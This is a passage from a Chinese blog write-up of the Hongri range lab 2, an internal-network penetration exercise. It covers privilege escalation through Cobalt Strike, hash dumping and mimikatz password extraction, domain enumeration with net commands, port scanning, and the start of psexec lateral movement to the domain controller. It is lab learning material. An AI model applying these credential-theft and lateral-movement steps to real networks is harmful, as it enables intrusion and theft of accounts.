+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921211734410.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921211734410.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220921211734410.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220921211734410.png"
+        title="image-20220921211734410" /></p>
+<p>提权不了</p>
+<h3 id="msf派生cs">msf派生cs</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922163656887.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922163656887.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922163656887.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922163656887.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922163656887.png"
+        title="image-20220922163656887" />、</p>
+<p>成功上线CS<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922184137897.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922184137897.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922184137897.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922184137897.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922184137897.png"
+        title="image-20220922184137897" /></p>
+<p>点击这里进行提权<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922184425260.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922184425260.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922184425260.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922184425260.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922184425260.png"
+        title="image-20220922184425260" /></p>
+<p>日志这面显示提权成功,目标这里也多了一个拥有system的机器，提权的时候，如果在msf上遇到瓶颈，尽早转战cs。不得不说，cs的beacon还是比msf的meterpreter稳定一点</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922210041668.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922210041668.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922210041668.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922210041668.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922210041668.png"
+        title="image-20220922210041668" /></p>
+<p>hash dump 抓一下用户的密码哈希值</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922214453655.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922214453655.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922214453655.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922214453655.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922214453655.png"
+        title="image-20220922214453655" /></p>
+<p>mimikatz查看明文密码</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922224631129.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922224631129.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922224631129.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922224631129.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922224631129.png"
+        title="image-20220922224631129" /></p>
+<pre tabindex="0"><code>shell ipconfig /all   # 查看本机ip，所在域
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222215230.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222215230.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222215230.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222215230.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922222215230.png"
+        title="image-20220922222215230" /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>shell net user /domain    <span style="color:#75715e">#查询域内用户</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222400222.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222400222.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222400222.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222400222.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922222400222.png"
+        title="image-20220922222400222" /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>shell net group <span style="color:#e6db74">&#34;domain admins&#34;</span> /domain   <span style="color:#75715e">#查看域管理员用户</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222540307.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222540307.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222540307.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222540307.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922222540307.png"
+        title="image-20220922222540307" /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>shell net group <span style="color:#e6db74">&#34;domain controllers&#34;</span> /domain     <span style="color:#75715e">#查看域控：</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222708608.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222708608.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222708608.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222708608.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922222708608.png"
+        title="image-20220922222708608" /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>shell net group <span style="color:#e6db74">&#34;domain computers&#34;</span> <span style="color:#f92672">/</span>domain  <span style="color:#75715e"># 查看域中的其他主机名</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222949178.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222949178.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222949178.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922222949178.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922222949178.png"
+        title="image-20220922222949178" /></p>
+<p>分别ping一下DC和PC，可以解析出主机ip地址。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>PC : <span style="color:#ae81ff">10.10.10.201</span>  DC : <span style="color:#ae81ff">10.10.10.10</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922223310194.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922223310194.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922223310194.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922223310194.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922223310194.png"
+        title="image-20220922223310194" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922223352624.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922223352624.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922223352624.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922223352624.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922223352624.png"
+        title="image-20220922223352624" /></p>
+<p>ping不通PC主机可能是因为被防火墙拦截了。</p>
+<p>目标主机所在的网络存在域环境，域名为<code>de1ay.com</code>，域控制器为<code>DC.de1ay.com</code>，主机名为<code>DC</code>，域管理员为<code>Administrator</code></p>
+<p>存在两台域主机<code>WEB</code>和<code>PC</code></p>
+<h3 id="横向移动">横向移动</h3>
+<p>portscan 网段 端口 协议（icmp arp none）线程
+portscan 10.10.10.0/24 445 arp 50</p>
+<pre tabindex="0"><code>内网主机探活+端口扫描
+portscan 10.10.10.0/24 1-1024,3389,5000-6000 arp 1024            
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922225708940.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922225708940.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922225708940.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922225708940.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922225708940.png"
+        title="image-20220922225708940" /></p>
+<p>扫描发现域控开放445端口。可以尝试<code>psexec横向移动</code></p>
+<p>创建smb</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922231950118.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922231950118.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922231950118.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922231950118.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922231950118.png"
+        title="image-20220922231950118" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922232117001.png"
+        data-srcset="C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922232117001.png, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922232117001.png 1.5x, C:%5cUsers%5c%e8%be%be%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20220922232117001.png 2x"
+        data-sizes="auto"
+        alt="C:\Users\达\AppData\Roaming\Typora\typora-user-images\image-20220922232117001.png"
+        title="image-20220922232117001" /></p>
+<p>对目标10.10.10.10(DC)进行横向移动</p>
+<p>在狙击镜里选择psexec，填好监听</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" data-title="红日靶场2" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" data-title="红日靶场2"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" data-title="红日靶场2"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" data-title="红日靶场2"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ctf/0xgame2022/" class="prev" rel="prev" title="0xgame2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>0xgame2022</a>
+            <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" class="next" rel="next" title="红日靶场 1">红日靶场 1<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
